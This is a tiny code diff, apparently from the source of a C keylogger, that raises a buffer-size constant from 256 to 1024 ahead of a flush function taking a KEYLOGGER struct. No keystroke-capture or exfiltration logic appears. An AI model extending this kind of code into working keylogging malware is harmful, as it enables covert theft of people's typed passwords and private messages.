@@ -1,5 +1,5 @@
 #include "flush.h"
-#define MAX_BUFF_SIZE 256
+#define MAX_BUFF_SIZE 1024
 
 void flush(struct KEYLOGGER*keylogger)
 {
